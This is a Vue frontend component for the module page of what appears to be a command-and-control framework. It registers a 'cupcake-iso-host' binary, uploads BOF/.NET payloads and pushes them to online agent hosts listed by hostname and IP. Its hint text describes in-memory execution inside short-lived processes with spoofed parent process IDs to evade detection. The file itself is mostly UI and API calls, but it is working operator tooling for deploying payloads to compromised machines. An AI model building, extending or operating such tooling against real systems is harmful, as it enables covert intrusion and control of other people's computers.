<template>
  <div class="view-shell module-shell">
    <section class="surface-card module-card">
      <div class="panel-head">
        <div>
          <span class="panel-kicker">L2 Modules</span>
          <h3>模块仓库</h3>
          <p class="hint">
            登记隔离宿主 <code>iso_host</code>（cupcake-iso-host.exe）。
            插件库放 BOF/.NET <strong>载荷</strong>；运行时会 stage 宿主并在 PPID 伪装短命进程中内存执行。
          </p>
        </div>
        <el-button type="primary" :loading="loading" @click="refresh">
          刷新列表
        </el-button>
      </div>

      <div class="workflow">
        <div class="step">
          <strong>1. 构建宿主</strong>
          <code>cargo build -p cupcake-iso-host --release</code>
        </div>
        <div class="step">
          <strong>2. 上传登记</strong>
          <span>ID=<code>iso_host</code>，文件 cupcake-iso-host.exe</span>
        </div>
        <div class="step">
          <strong>3. 推送到主机或插件页运行</strong>
          <span>推送成功会提示；已存活则按钮置灰</span>
        </div>
      </div>

      <el-divider />

      <el-form label-position="top" class="upload-form" @submit.prevent>
        <div class="form-row">
          <el-form-item label="模块 ID" required>
            <el-input v-model="uploadForm.id" placeholder="iso_host" style="width: 200px" />
          </el-form-item>
          <el-form-item label="模块文件 (.exe / .dll / .bin)" required>
            <input type="file" ref="fileInput" @change="onFileChange" />
          </el-form-item>
          <el-form-item label=" ">
            <el-button type="primary" :loading="uploading" :disabled="!uploadForm.file" @click="doUpload">
              上传并登记
            </el-button>
          </el-form-item>
        </div>
      </el-form>

      <el-table :data="modules" v-loading="loading" empty-text="仓库为空 — 请先上传 iso_host">
        <el-table-column prop="id" label="ID" width="120" />
        <el-table-column prop="name" label="名称" width="140" />
        <el-table-column prop="description" label="描述" min-width="240" show-overflow-tooltip />
        <el-table-column prop="kind" label="类型" width="90">
          <template #default="{ row }">
            <el-tag size="small" :type="kindTag(row.kind)">{{ kindLabel(row.kind) }}</el-tag>
          </template>
        </el-table-column>
        <el-table-column label="大小" width="100">
          <template #default="{ row }">{{ formatSize(row.size) }}</template>
        </el-table-column>
        <el-table-column label="操作" min-width="360" fixed="right">
          <template #default="{ row }">
            <el-button size="small" @click="packPreview(row)">打包预览</el-button>
            <el-select
              v-model="pushTarget[row.id]"
              placeholder="选择在线主机"
              clearable
              filterable
              style="width: 200px; margin: 0 8px"
              @change="() => onTargetChange(row.id)"
            >
              <el-option
                v-for="c in onlineClients"
                :key="c.uuid"
                :label="`${c.hostname || c.uuid.slice(0, 8)} (${c.ip || '-'})`"
                :value="c.uuid"
              />
            </el-select>
            <el-button
              size="small"
              type="primary"
              :loading="pushing === row.id"
              :disabled="!pushTarget[row.id] || isPushedAlive(row.id)"
              @click="pushToAgent(row)"
            >
              {{ isPushedAlive(row.id) ? '已在目标存活' : '推送' }}
            </el-button>
          </template>
        </el-table-column>
      </el-table>

      <el-alert
        v-if="packInfo"
        class="pack-alert"
        type="info"
        :closable="true"
        @close="packInfo = ''"
        :title="packInfo"
      />
    </section>
  </div>
</template>

<script setup>
import { onMounted, reactive, ref } from 'vue'
import { ElMessage, ElNotification } from 'element-plus'
import api from '../api/index'

const loading = ref(false)
const uploading = ref(false)
const pushing = ref('')
const modules = ref([])
const onlineClients = ref([])
const pushTarget = reactive({})
/** moduleId -> { [uuid]: true } when staged/alive on that agent */
const aliveMap = reactive({})
const packInfo = ref('')
const fileInput = ref(null)

const uploadForm = reactive({
  id: 'iso_host',
  file: null
})

const formatSize = (n) => {
  if (!n) return '—'
  if (n < 1024) return `${n} B`
  if (n < 1024 * 1024) return `${(n / 1024).toFixed(1)} KB`
  return `${(n / 1024 / 1024).toFixed(2)} MB`
}

const kindLabel = (k) => {
  const m = { host: '宿主', runtime: '运行时', legacy: '遗留', custom: '自定义' }
  return m[k] || k || '—'
}
const kindTag = (k) => {
  if (k === 'host') return 'warning'
  if (k === 'legacy') return 'info'
  return 'success'
}

const isPushedAlive = (moduleId) => {
  const uuid = pushTarget[moduleId]
  if (!uuid) return false
  return !!(aliveMap[moduleId] && aliveMap[moduleId][uuid])
}

const markAlive = (moduleId, uuid) => {
  if (!aliveMap[moduleId]) aliveMap[moduleId] = {}
  aliveMap[moduleId][uuid] = true
}

const refresh = async () => {
  loading.value = true
  try {
    const [modRes, cliRes] = await Promise.all([
      api.get('/api/modules'),
      api.get('/api/clients')
    ])
    const list = modRes.data?.modules || []
    modules.value = list.map((m) =>
      typeof m === 'string'
        ? { id: m, name: m, description: '', size: 0, kind: 'custom' }
        : m
    )
    const clients = Array.isArray(cliRes.data) ? cliRes.data : (cliRes.data?.clients || [])
    onlineClients.value = clients.filter((c) => (c.status || '').toLowerCase() !== 'offline')
  } catch (e) {
    ElMessage.error(e?.response?.data?.error || '加载模块列表失败')
  } finally {
    loading.value = false
  }
}

const onTargetChange = async (moduleId) => {
  const uuid = pushTarget[moduleId]
  if (!uuid) return
  // Refresh loaded flags for this agent
  try {
    const res = await api.get('/api/modules', { params: { uuid } })
    const list = res.data?.modules || []
    for (const m of list) {
      if (typeof m === 'object' && m.loaded_on_agent) {
        markAlive(m.id, uuid)
      }
    }
  } catch (_) {
    /* ignore */
  }
}

const onFileChange = (e) => {
  uploadForm.file = e.target.files?.[0] || null
}

const doUpload = async () => {
  if (!uploadForm.id || !uploadForm.file) {
    ElMessage.warning('请填写模块 ID 并选择文件')
    return
  }
  uploading.value = true
  try {
    const fd = new FormData()
    fd.append('id', uploadForm.id.trim())
    fd.append('file', uploadForm.file)
    const res = await api.post('/api/modules/upload', fd, {
      headers: { 'Content-Type': 'multipart/form-data' }
    })
    ElNotification({
      title: '登记成功',
      message: res.data?.name
        ? `${res.data.name}（${res.data.id}）已登记：${res.data.description || ''}`
        : `模块 ${uploadForm.id} 已登记`,
      type: 'success',
      duration: 4000
    })
    uploadForm.file = null
    if (fileInput.value) fileInput.value.value = ''
    await refresh()
  } catch (e) {
    ElNotification({
      title: '上传失败',
      message: e?.response?.data?.error || '上传失败',
      type: 'error'
    })
  } finally {
    uploading.value = false
  }
}

const pushToAgent = async (row) => {
  const id = row.id
  const uuid = pushTarget[id]
  if (!uuid) return
  if (isPushedAlive(id)) {
    ElMessage.info(`「${row.name || id}」已在该主机存活，无需重复推送`)
    return
  }
  pushing.value = id
  try {
    const res = await api.post('/api/modules/push', { uuid, id })
    const data = res.data || {}
    markAlive(id, uuid)
    ElNotification({
      title: '推送成功',
      message: data.msg || `模块 ${data.name || id} 已在目标主机就绪`,
      type: 'success',
      duration: 5000
    })
    if (data.warning) {
      ElMessage.warning(data.warning)
    }
  } catch (e) {
    ElNotification({
      title: '推送失败',
      message: e?.response?.data?.error || '推送失败（模块未登记或主机离线）',
      type: 'error',
      duration: 5000
    })
  } finally {
    pushing.value = ''
  }
}

const packPreview = async (row) => {
  try {
    const res = await api.get(`/api/modules/pack/${row.id}`)
    const len = (res.data?.data || '').length
    packInfo.value = `${res.data?.name || row.id}：CKMS 打包成功，base64 长度 ${len}。${res.data?.description || ''}`
  } catch (e) {
    ElMessage.error(e?.response?.data?.error || '打包失败')
  }
}

onMounted(refresh)
</script>

<style scoped>
.module-shell { padding: 0; }
.module-card { padding: 20px 24px; }
.panel-head {
  display: flex;
  justify-content: space-between;
  align-items: flex-start;
  gap: 16px;
  margin-bottom: 16px;
}
.panel-kicker {
  display: block;
  font-size: 12px;
  letter-spacing: 0.08em;
  text-transform: uppercase;
  opacity: 0.55;
  margin-bottom: 4px;
}
.hint { margin: 8px 0 0; opacity: 0.75; line-height: 1.5; max-width: 720px; }
.hint code { font-size: 12px; }
.workflow {
  display: grid;
  grid-template-columns: repeat(auto-fit, minmax(220px, 1fr));
  gap: 12px;
  margin-bottom: 8px;
}
.step {
  padding: 12px 14px;
  border-radius: 10px;
  background: rgba(255, 255, 255, 0.03);
  border: 1px solid rgba(255, 255, 255, 0.06);
  display: flex;
  flex-direction: column;
  gap: 6px;
  font-size: 13px;
}
.step code {
  font-size: 11px;
  word-break: break-all;
  opacity: 0.85;
}
.form-row {
  display: flex;
  flex-wrap: wrap;
  gap: 16px;
  align-items: flex-end;
}
.pack-alert { margin-top: 16px; }
</style>
